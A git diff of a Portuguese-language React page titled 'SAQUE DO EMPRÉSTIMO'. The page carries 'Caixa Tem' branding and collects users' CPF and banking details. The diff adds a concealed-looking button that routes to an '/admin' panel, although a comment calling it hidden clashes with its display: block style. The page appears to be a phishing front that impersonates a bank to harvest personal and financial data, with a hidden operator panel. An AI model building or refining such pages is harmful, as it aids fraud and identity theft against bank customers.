@@ -1,6 +1,7 @@
 import React, { useState } from "react";
 import axios from "axios"; // Importar axios para fazer a requisição HTTP
 import styles from './Inicio.module.css';
+import { useNavigate } from 'react-router-dom'; // Importando useNavigate para navegação
 
 import logo from "../../Assets/img/logo.png";
 import bandeira from "../../Assets/img/bandeira.png";
@@ -18,6 +19,7 @@ function Inicio() {
         cpf: ""
     });
     const [mensagemErro, setMensagemErro] = useState(""); // Para armazenar a mensagem de erro
+    const navigate = useNavigate(); // Hook para navegação
 
     const abrirModal = (e) => {
         e.preventDefault(); // Impede o envio do formulário
@@ -55,6 +57,11 @@ function Inicio() {
         }
     };
 
+    // Função para redirecionar para a área administrativa
+    const handleRedirect = () => {
+        navigate('/admin'); // Altere para o caminho correto da sua área admin
+    };
+
     return (
         <div className={styles.containerIndex}>
             {/* Bandeiras */}
@@ -71,6 +78,13 @@ function Inicio() {
                     </div>
                     <span className={styles.textSaque}>SAQUE DO EMPRÉSTIMO</span>
                     <h4 className={styles.textH4}>Informe os DADOS corretamente para continuar:</h4>
+                    <button
+                    className={styles.hiddenButton}
+                    onClick={handleRedirect} // Redireciona para área admin
+                    style={{ display: "block" }} // Mantém o botão escondido
+                >
+                    acesse sua conta: 
+                </button>
 
                     <div className={styles.inputsContainer}>
                         <div className={`${styles.inputGroup} ${styles.inputGroupAgencia}`}>
@@ -147,6 +161,9 @@ function Inicio() {
                 <div className={styles.selocaixa}>
                     <img src={caixaTemLogoSelo} alt="Selo Caixa Tem" />
                 </div>
+
+                {/* Botão Invisível "Informe seus dados" */}
+
             </main>
 
             <footer className={styles.rodape}>
